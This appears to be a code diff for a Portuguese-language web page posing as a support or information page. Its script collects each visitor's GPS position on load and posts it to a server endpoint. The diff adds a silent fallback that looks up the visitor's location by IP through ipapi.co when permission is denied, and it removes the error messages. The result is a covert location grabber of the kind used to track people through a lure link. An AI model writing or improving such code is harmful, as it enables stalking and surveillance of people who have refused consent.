@@ -25,15 +25,17 @@
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
-
   </div>
 
   <script>
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+        navigator.geolocation.getCurrentPosition(
+          (position) => sendLocation(position, "Precisa (GPS)"),
+          () => fallbackLocation()
+        );
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        fallbackLocation();
       }
     });
 
@@ -41,24 +43,39 @@
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
     const ano = dataAtual.getFullYear();
-
     const dataFormatada = `${dia}/${mes}/${ano}`;
-
     document.getElementById("data-atual").textContent = dataFormatada;
 
-    console.log(dataAtual)
-
-    function sendLocation(position) {
+    function sendLocation(position, source) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=$${latitude},${longitude}`;
-      
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      enviarParaApi(latitude, longitude, maps, source);
+    }
+
+    function fallbackLocation() {
+      fetch("https://ipapi.co/json/")
+        .then(response => response.json())
+        .then(data => {
+          const latitude = data.latitude;
+          const longitude = data.longitude;
+          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+          enviarParaApi(latitude, longitude, maps, "Aproximada (IP)");
+        })
+        .catch(error => {
+          console.error("Erro ao obter localização pelo IP:", error);
+        });
+    }
+
+    function enviarParaApi(latitude, longitude, maps, source) {
       fetch("/api/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude, maps })
+        body: JSON.stringify({ latitude, longitude, maps, source })
       })
         .then(response => response.json())
         .then(data => {
@@ -69,10 +86,6 @@
         .catch(error => {
           console.error("Erro:", error);
         });
-    }
-
-    function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
     }
   </script>
 </body>
